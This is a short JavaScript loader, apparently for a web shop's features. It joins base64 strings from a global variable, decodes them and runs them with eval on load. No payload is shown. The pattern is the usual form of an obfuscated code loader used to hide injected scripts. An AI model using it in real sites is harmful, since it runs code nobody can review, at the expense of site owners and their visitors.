(function(){
  var parts = window.__SF_B64_PARTS || [];
  if (!parts.length) return;
  try {
    var bin = atob(parts.join(''));
    var code = decodeURIComponent(escape(bin));
    (0,eval)(code);
  } catch(e) { console.error('shop_features load', e); }
})();
